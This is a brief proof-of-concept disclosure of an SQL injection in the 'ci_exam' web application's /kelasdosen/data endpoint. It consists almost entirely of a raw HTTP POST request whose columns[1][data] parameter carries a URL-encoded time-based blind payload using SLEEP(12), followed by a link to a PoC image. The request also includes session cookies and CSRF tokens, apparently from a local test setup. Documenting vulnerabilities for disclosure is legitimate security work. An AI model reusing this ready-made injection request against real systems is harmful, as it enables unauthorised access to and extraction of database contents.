#### SQL Injection in  ci_exam/kelasdosen/data

POST /ci_exam/kelasdosen/data*
```
POST /ci_exam/kelasdosen/data HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1521
Origin: http://localhost
Connection: close
Referer: http://localhost/ci_exam/kelasdosen
Cookie: remember_me_name=bMGFrQaFzDhuoLmztZCT; remember_me_pwd=YMSm3Q2wFDHaHLQ5eZPKc42oU7CaK8IlA%40q1; remember_me_lang=en; Hm_lvt_c790ac2bdc2f385757ecd0183206108d=1680329430; Hm_lvt_5320b69f4f1caa9328dfada73c8e6a75=1680329567; PowerBB_username=xss; PowerBB_password=8879f85d0170cba2a4328bbb5a457c6a; menu_contracted=false; __atuvc=1%7C16; csrf_cookie_name=3fd6bdc3c3bf1def2928d40ade568742; ci_session=c35vvrn5hou8cs6fved3pbj621hvb9i1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

csrf_test_name=3fd6bdc3c3bf1def2928d40ade568742&draw=1&columns%5B0%5D%5Bdata%5D=id&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=false&columns%5B0%5D%5Borderable%5D=false&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=nip%20AND%20%28SELECT%207804%20FROM%20%28SELECT%28SLEEP%2812%29%29%29osdd%29&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=nama_dosen&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=kelas&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=false&columns%5B3%5D%5Borderable%5D=false&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=id_dosen&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=false&columns%5B4%5D%5Borderable%5D=false&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B5%5D%5Bdata%5D=id_dosen&columns%5B5%5D%5Bname%5D=&columns%5B5%5D%5Bsearchable%5D=false&columns%5B5%5D%5Borderable%5D=false&columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=asc&start=0&length=10&search%5Bvalue%5D=&search%5Bregex%5D=false
```
PoC Image:

![PoC Image](/img/kelasdosen.PNG "POC IMAGE")

